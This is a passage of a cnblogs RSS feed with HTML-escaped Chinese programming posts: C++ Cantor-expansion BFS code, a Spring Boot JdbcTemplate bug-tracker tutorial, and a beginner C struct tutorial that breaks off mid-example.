            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(vvis[j]) &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
             &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(tp==&lt;span&gt;0&lt;/span&gt;&lt;span&gt;){
                 vvis[j]&lt;/span&gt;=&lt;span&gt;1&lt;/span&gt;,A[i]=&lt;span&gt;j;
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            } tp&lt;/span&gt;--&lt;span&gt;;
        }
        x&lt;/span&gt;=x%jc[N-&lt;span&gt;i];
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}

inline &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; get1(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; x){
    inv_Cantor(x);
    swap(A[&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;],A[&lt;span&gt;8&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;],A[&lt;span&gt;7&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;],A[&lt;span&gt;6&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;],A[&lt;span&gt;5&lt;/span&gt;&lt;span&gt;]);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Cantor();
}

inline &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; get2(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; x){
    inv_Cantor(x);
    swap(A[&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;],A[&lt;span&gt;4&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;],A[&lt;span&gt;4&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;],A[&lt;span&gt;4&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;],A[&lt;span&gt;8&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;],A[&lt;span&gt;6&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;],A[&lt;span&gt;7&lt;/span&gt;&lt;span&gt;]);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Cantor();
}

inline &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; get3(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; x){
    inv_Cantor(x);
    swap(A[&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;],A[&lt;span&gt;7&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;],A[&lt;span&gt;3&lt;/span&gt;&lt;span&gt;]);
    swap(A[&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;],A[&lt;span&gt;7&lt;/span&gt;&lt;span&gt;]);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Cantor();
}

inline &lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; init(){
    jc[&lt;/span&gt;&lt;span&gt;0&lt;/span&gt;]=&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=&lt;span&gt;1&lt;/span&gt;;i&amp;lt;=N;i++&lt;span&gt;) 
        jc[i]&lt;/span&gt;=jc[i-&lt;span&gt;1&lt;/span&gt;]*&lt;span&gt;i;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}

inline &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; print(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; u){
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(u==&lt;span&gt;1&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
    print(com[u]);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(last[u]==&lt;span&gt;1&lt;/span&gt;) printf(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;A&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(last[u]==&lt;span&gt;2&lt;/span&gt;) printf(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;B&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(last[u]==&lt;span&gt;3&lt;/span&gt;) printf(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;C&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
}

&lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; BFS(){
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; end=&lt;span&gt;Cantor();
    queue&lt;/span&gt;&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt; q; q.push(&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
    dis[&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;]=&lt;span&gt;0&lt;/span&gt;,vis[&lt;span&gt;1&lt;/span&gt;]=&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;(!&lt;span&gt;q.empty()){
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; u=&lt;span&gt;q.front(); q.pop();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(u==&lt;span&gt;end){
            printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%d\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,dis[u]);
            print(u);
            printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; t1=get1(u),t2=get2(u),t3=&lt;span&gt;get3(u);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;vis[t1]){
            dis[t1]&lt;/span&gt;=dis[u]+&lt;span&gt;1&lt;/span&gt;,vis[t1]=&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            last[t1]&lt;/span&gt;=&lt;span&gt;1&lt;/span&gt;,com[t1]=&lt;span&gt;u;
            q.push(t1);    
        }    
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;vis[t2]){
            dis[t2]&lt;/span&gt;=dis[u]+&lt;span&gt;1&lt;/span&gt;,vis[t2]=&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            last[t2]&lt;/span&gt;=&lt;span&gt;2&lt;/span&gt;,com[t2]=&lt;span&gt;u;
            q.push(t2);
        }
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;(!&lt;span&gt;vis[t3]){
            dis[t3]&lt;/span&gt;=dis[u]+&lt;span&gt;1&lt;/span&gt;,vis[t3]=&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            last[t3]&lt;/span&gt;=&lt;span&gt;3&lt;/span&gt;,com[t3]=&lt;span&gt;u;
            q.push(t3);
        }
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; main(){
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt; i=&lt;span&gt;1&lt;/span&gt;;i&amp;lt;=N;i++&lt;span&gt;) 
        A[i]&lt;/span&gt;=&lt;span&gt;read();
    init(); BFS();
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Fri, 15 Feb 2019 15:45:00 +0000</pubDate>
<dc:creator>Fugtemypt</dc:creator>
<og:description>注意：本文所有的排名均是从第0名开始。 康托展开： 已知一个$1—n$的排列$A=\{a_1,a_2,\cdots,a_n\}$，求它在所有排列中的字典序排名。 常用于将$n$个全排列映射到$n!$个</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/YSFAC/p/10386201.html</dc:identifier>
</item>
<item>
<title>Springboot+JdbcTemplate +thymeleaf 页面  做迷你版的bug系统 - 夏天里的Jasmine</title>
<link>http://www.cnblogs.com/qianjinyan/p/10097451.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/qianjinyan/p/10097451.html</guid>
<description>&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;a href=&quot;https://www.cnblogs.com/qianjinyan/p/10065160.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/qianjinyan/p/10065160.html&lt;/a&gt; &lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在我上一篇随笔中介绍了关于要做的系统的数据结构，连接如上&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;今天实现连接mssql server，查询出所有buglist的效果，CRUD&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;实现方法极其简单，如下图&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1064427/201812/1064427-20181221101645218-749977777.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　Bug类对象中列出字段&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;59&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
package com.jasmine.demo.bean;

public class Bug {

    private long id;
    private String pname;
    private String crname;
    private String crnum;
    private String tasknum;
    private String oname;
    private String description;
    private String rca;
    private String solution;
    private String developer;
    private String tester;
    private String creationdt;
    private String updatedt;

    public long getId() {
        return id;
    }

    public void setId(long id) {
        this.id = id;
    }

    public String getPname() {
        return pname;
    }

    public void setPname(String pname) {
        this.pname = pname;
    }

    public String getCrname() {
        return crname;
    }

    public void setCrname(String crname) {
        this.crname = crname;
    }

    public String getCrnum() {
        return crnum;
    }

    public void setCrnum(String crnum) {
        this.crnum = crnum;
    }

    public String getTasknum() {
        return tasknum;
    }

    public void setTasknum(String tasknum) {
        this.tasknum = tasknum;
    }

    public String getOname() {
        return oname;
    }

    public void setOname(String oname) {
        this.oname = oname;
    }

    public String getDescription() {
        return description;
    }

    public void setDescription(String description) {
        this.description = description;
    }

    public String getRca() {
        return rca;
    }

    public void setRca(String rca) {
        this.rca = rca;
    }

    public String getSolution() {
        return solution;
    }

    public void setSolution(String solution) {
        this.solution = solution;
    }

    public String getDeveloper() {
        return developer;
    }

    public void setDeveloper(String developer) {
        this.developer = developer;
    }

    public String getTester() {
        return tester;
    }

    public void setTester(String tester) {
        this.tester = tester;
    }

    public String getCreationdt() {
        return creationdt;
    }

    public void setCreationdt(String creationdt) {
        this.creationdt = creationdt;
    }

    public String getUpdatedt() {
        return updatedt;
    }

    public void setUpdatedt(String updatedt) {
        this.updatedt = updatedt;
    }

    @Override
    public String toString() {
        return &quot;Bug{&quot; +
                &quot;id=&quot; + id +
                &quot;, pname='&quot; + pname + '\'' +
                &quot;, crname='&quot; + crname + '\'' +
                &quot;, crnum='&quot; + crnum + '\'' +
                &quot;, tasknum='&quot; + tasknum + '\'' +
                &quot;, oname='&quot; + oname + '\'' +
                &quot;, description='&quot; + description + '\'' +
                &quot;, rca='&quot; + rca + '\'' +
                &quot;, solution='&quot; + solution + '\'' +
                &quot;, developer='&quot; + developer + '\'' +
                &quot;, tester='&quot; + tester + '\'' +
                &quot;, creationdt='&quot; + creationdt + '\'' +
                &quot;, updatedt='&quot; + updatedt + '\'' +
                '}';
    }

    public Bug() {
        super();
    }

    public Bug(long id, String pname, String crname, String crnum, String tasknum, String oname, String description, String rca, String solution, String developer, String tester, String creationdt, String updatedt) {
        this.id = id;
        this.pname = pname;
        this.crname = crname;
        this.crnum = crnum;
        this.tasknum = tasknum;
        this.oname = oname;
        this.description = description;
        this.rca = rca;
        this.solution = solution;
        this.developer = developer;
        this.tester = tester;
        this.creationdt = creationdt;
        this.updatedt = updatedt;
    }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;pre&gt;
BugService 接口中定义了增删查改等方法&lt;br/&gt;具体实现是在对应的impl中
&lt;/pre&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;52&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
package com.jasmine.demo.service;

import com.jasmine.demo.bean.Bug;

import java.util.List;

public interface BugService {

    List&amp;lt;Bug&amp;gt; findAll();

    Bug findById(int id);

    int create(String pname,String crname,String crnum, String tasknum, String oname, String description, String rca, String solution, String developer, String tester);

    int update(long id, String crnum, String tasknum, String oname, String description, String rca, String solution, String developer, String tester);

    int deleteByID(int id);


}
&lt;/pre&gt;&lt;/div&gt;


&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;131&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
package com.jasmine.demo.service.impl;

import com.jasmine.demo.bean.Bug;
import com.jasmine.demo.jdbc.BugRowMapper;
import com.jasmine.demo.service.BugService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Service;

import java.util.List;

@Service
public class BugServiceImpl implements BugService {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    @Override
    public List&amp;lt;Bug&amp;gt; findAll() {

        String sql = &quot;SELECT BUG_ID,PROJECT_NAME,CR_NAME,BUG_CR_NUM,BUG_TASK_NUM,OBJECT_NAME,BUG_DESCRIPTION\n&quot; +
                &quot;,BUG_RCA,BUG_SOLUTION,B.EMPLOY_NAME DEVELOPER,A.EMPLOY_NAME TESTER,QA_CREATIONDT,QA_UPDATEDT,BUG_DELETED_FLAG\n&quot; +
                &quot;FROM QA_BUGLIST\n&quot; +
                &quot;JOIN QA_PROJECT ON BUG_PROJECT_ID = PROJECT_ID\n&quot; +
                &quot;JOIN QA_CRTYPE ON CR_ID = BUG_CR_TYPE_ID\n&quot; +
                &quot;JOIN QA_RTYPE ON OBJECT_ID = QA_TYPE_ID\n&quot; +
                &quot;JOIN QA_EMPLOY A ON A.[EMPLOY_ID] = QA_TESTER_ID AND A.[EMPLOY_GROUP] = 1 ---表示测试\n&quot; +
                &quot;JOIN QA_EMPLOY B ON B.[EMPLOY_ID] = QA_ASSIGNEE_ID AND B.[EMPLOY_GROUP] = 2 ---表示开发人员\n&quot; +
                &quot;WHERE BUG_DELETED_FLAG =0 order by 1 desc&quot;;
        List&amp;lt;Bug&amp;gt; bugs = jdbcTemplate.query(sql,new BugRowMapper() );
        return bugs;

    }

    @Override
    public Bug findById(int id) {
        String sql = &quot;SELECT BUG_ID,PROJECT_NAME,CR_NAME,isnull(BUG_CR_NUM,'') as BUG_CR_NUM,isnull(BUG_TASK_NUM,'') as BUG_TASK_NUM,OBJECT_NAME,isnull(BUG_DESCRIPTION,'') as BUG_DESCRIPTION\n&quot; +
                &quot;,isnull(BUG_RCA,'') as BUG_RCA,isnull(BUG_SOLUTION,'') as BUG_SOLUTION,B.EMPLOY_NAME DEVELOPER,A.EMPLOY_NAME TESTER,QA_CREATIONDT,QA_UPDATEDT,BUG_DELETED_FLAG\n&quot; +
                &quot;FROM QA_BUGLIST\n&quot; +
                &quot;JOIN QA_PROJECT ON BUG_PROJECT_ID = PROJECT_ID\n&quot; +
                &quot;JOIN QA_CRTYPE ON CR_ID = BUG_CR_TYPE_ID\n&quot; +
                &quot;JOIN QA_RTYPE ON OBJECT_ID = QA_TYPE_ID\n&quot; +
                &quot;JOIN QA_EMPLOY A ON A.[EMPLOY_ID] = QA_TESTER_ID AND A.[EMPLOY_GROUP] = 1 ---表示测试\n&quot; +
                &quot;JOIN QA_EMPLOY B ON B.[EMPLOY_ID] = QA_ASSIGNEE_ID AND B.[EMPLOY_GROUP] = 2 ---表示开发人员\n&quot; +
                &quot;WHERE BUG_DELETED_FLAG =0 and BUG_ID = ?&quot;;
        Bug bug = jdbcTemplate.queryForObject(sql,new BugRowMapper(),id);
        return bug;
    }

    @Override
    public int create(String pname,String crname,String crnum, String tasknum, String oname, String description, String rca, String solution, String developer, String tester) {
        String sql =&quot;INSERT QA_BUGLIST(BUG_PROJECT_ID,BUG_CR_TYPE_ID,BUG_CR_NUM,BUG_TASK_NUM,QA_TYPE_ID,BUG_DESCRIPTION,BUG_RCA,BUG_SOLUTION,QA_ASSIGNEE_ID,QA_TESTER_ID,QA_CREATIONDT,QA_UPDATEDT)\n&quot; +
                &quot;VALUES(?,?,?,?,?,?,?,?,?,?,GETDATE(),GETDATE())&quot;;
        return jdbcTemplate.update(sql,pname,crname,crnum,tasknum,oname,description,rca,solution,developer,tester);
    }

    @Override
    public int update(long id, String crnum, String tasknum,  String description, String rca, String solution, String developer, String tester,String oname){
        String sql = &quot;update QA_BUGLIST set BUG_CR_NUM =?,BUG_TASK_NUM =?,BUG_DESCRIPTION=?,BUG_RCA=?,BUG_SOLUTION= ?,QA_UPDATEDT =getdate() where BUG_ID = ?&quot;;
        System.out.println(sql);
        return jdbcTemplate.update(sql,crnum,tasknum,description,rca,solution,id);
    }

    @Override
    public int deleteByID(int id) {
        String sql = &quot;update QA_BUGLIST set BUG_DELETED_FLAG = 1,  BUG_DELETED_COMMENT = '逻辑删除' where BUG_ID = ?&quot;;
        System.out.println(sql);
         int count = jdbcTemplate.update(sql,id);
        return count;
    }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;pre readability=&quot;4&quot;&gt;
&lt;span readability=&quot;2&quot;&gt;&lt;p&gt;DB的配置写在application.xml中&lt;/p&gt;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1064427/201812/1064427-20181210165352406-1012878386.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;启动类之后，跳转的所有页面，写在controller中，&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;span&gt;启动后，打开连接，看到自己的数据&lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;接下来要做的就是让页面好看一点，这样的数据看不清楚&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;JdbcTemplate&lt;/p&gt;
&lt;p&gt;thymeleaf&lt;/p&gt;

&lt;p&gt;页面跳转等等，页面比较丑，还没做分页，搜寻条件也没有添加&lt;/p&gt;
&lt;p&gt;1. 查看所有bug&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1064427/201812/1064427-20181221102132717-1972310388.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2. 查看指定bug的详细信息&lt;/p&gt;
&lt;p&gt;点击查看按钮后显示单个bug的信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1064427/201812/1064427-20181221102236035-1042425021.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3. 删除单列bug信息，点击单个bug信息后面的删除按钮即可删除，删除之前最好有确定按钮用来提示，以免误删&lt;/p&gt;
&lt;p&gt;4. 更新，我这边做在查看单个详细列表页面中，如上图，有信息更新按钮，点击后带入原先的参数跳转到更新页面，在新的页面进行更新，然后保存&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1064427/201812/1064427-20181221102524596-816702562.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;5. 新增bug页面，在查看所有bug页面有新增按钮，点击进入如下页面，保存进行新增操作&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1064427/201812/1064427-20181221102617004-117888436.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 源代码提交在github地址如下：&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://github.com/JasmineQian/SpringbootDemoDay03&quot; target=&quot;_blank&quot;&gt; https://github.com/JasmineQian/SpringbootDemoDay03&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/JasmineQian/SpringDemoDay03&quot; target=&quot;_blank&quot;&gt;&lt;span&gt; &lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 15 Feb 2019 15:44:00 +0000</pubDate>
<dc:creator>夏天里的Jasmine</dc:creator>
<og:description>https://www.cnblogs.com/qianjinyan/p/10065160.html 在我上一篇随笔中介绍了关于要做的系统的数据结构，连接如上 今天实现连接mssql server，查</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/qianjinyan/p/10097451.html</dc:identifier>
</item>
<item>
<title>结构体 - 巫师笔记</title>
<link>http://www.cnblogs.com/lvfengkun/p/10385690.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lvfengkun/p/10385690.html</guid>
<description>&lt;p&gt;1、结构体变量的初始化&lt;/p&gt;
&lt;p&gt;例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
#include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;StdAfx.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
#include&lt;/span&gt;&amp;lt;stdio.h&amp;gt;


&lt;span&gt;void&lt;/span&gt;&lt;span&gt; main()
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; 
    {
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; num;
        &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; *&lt;span&gt;name;
        &lt;/span&gt;&lt;span&gt;char&lt;/span&gt;&lt;span&gt; sex;
        &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;&lt;span&gt; score;
    }boy1,boy2&lt;/span&gt;={&lt;span&gt;102&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Jane&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;M&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;98.5&lt;/span&gt;&lt;span&gt;};
    boy1&lt;/span&gt;=&lt;span&gt;boy2;
    printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;number=%d\nname=%s\nscore=%f\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,boy1.num,boy1.name,boy1.score);
    printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;number=%d\nname=%s\nscore=%f\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,boy2.num,boy2.name,boy2.score);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;2、结构体数组&lt;/p&gt;
&lt;p&gt;一个结构体变量中可以存放一组数据（如一个学生的学号，姓名，成绩等数据）。若有10个学生的数据需要参加运算，显然应用数组，这就是结构体数组。结构体数组与数值型数组不同之处在于每一个数组元素都是一个结构体类型的数据，它们都分别包括各个成员项。&lt;/p&gt;
&lt;p&gt;例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
#include &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;StdAfx.h&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
#include&lt;/span&gt;&amp;lt;stdio.h&amp;gt;&lt;span&gt;
#include&lt;/span&gt;&amp;lt;stdlib.h&amp;gt;
&lt;span&gt;#define&lt;/span&gt; NUM 3
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; person
{
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; name[&lt;span&gt;20&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; phone[&lt;span&gt;10&lt;/span&gt;&lt;span&gt;];
};
&lt;/span&gt;&lt;span&gt;void&lt;/span&gt;&lt;span&gt; main()
{
    &lt;/span&gt;&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; person man[NUM];
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; i;
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(i=&lt;span&gt;0&lt;/span&gt;;i&amp;lt;NUM;i++&lt;span&gt;)
    {
        printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;input name:\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        gets(man[i].name);
        printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;input phone:\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        gets(man[i].phone);
    }
    printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\tname\t\t\tphone\n\n\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;(i=&lt;span&gt;0&lt;/span&gt;;i&amp;lt;NUM;i++&lt;span&gt;)
    {
        printf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%10s\t\t%10s\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,man[i].name,man[i].phone);
    }
    system(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;pause&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;定义结构体数组&lt;/p&gt;
&lt;p&gt;与其他类型数组一样，对结构体数组也可以初始化。&lt;/p&gt;
&lt;p&gt;例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; student
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; num;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; name[&lt;span&gt;20&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt;&lt;span&gt; sex;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; age;
    &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;&lt;span&gt; score;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; addr[&lt;span&gt;30&lt;/span&gt;&lt;span&gt;];
}stu[&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;] =&lt;span&gt; {
    {&lt;/span&gt;&lt;span&gt;101&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;LILIN&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;m&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;18&lt;/span&gt;,&lt;span&gt;97.5&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;beijing&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;},
    {&lt;/span&gt;&lt;span&gt;102&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;zhang&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;f&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;,&lt;span&gt;17&lt;/span&gt;,&lt;span&gt;99&lt;/span&gt;,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;shanghai&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;}
};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;也可用如下形式：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt;struct&lt;/span&gt;&lt;span&gt; student
{
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; num;
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt; name[&lt;span&gt;20&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;char&lt;/span&gt;&lt;span&gt; sex;
